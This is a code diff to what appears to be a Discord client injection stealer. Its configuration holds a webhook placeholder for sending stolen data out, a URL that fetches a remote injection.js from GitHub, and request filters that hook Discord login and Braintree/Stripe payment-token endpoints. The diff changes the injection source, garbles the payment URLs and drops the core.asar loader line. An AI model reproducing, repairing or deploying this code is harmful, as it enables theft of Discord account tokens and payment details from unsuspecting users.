@@ -12,7 +12,7 @@ const {
 
 const CONFIG = {
     webhook: "%WEBHOOK%",
-    injection_url: "https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
+    injection_url: "https://raw.githubusercontent.com/ImJoke/discord-injection/main/injection.js",
     filters: {
         urls: [
             '/auth/login',
@@ -32,8 +32,8 @@ const CONFIG = {
     },
     payment_filters: {
         urls: [
-            'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
-            'https://api.stripe.com/v*/tokens',
+            'https://api.braintreegateway.com/amerchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
+            'https://api.stripe.com/v*/tokenaas',
         ],
     },
     API: "https://discord.com/api/v9/users/@me",
@@ -630,5 +630,3 @@ session.defaultSession.webRequest.onBeforeRequest(CONFIG.filters2, (details, cal
         cancel: true
     })
 });
-
-module.exports = require("./core.asar");
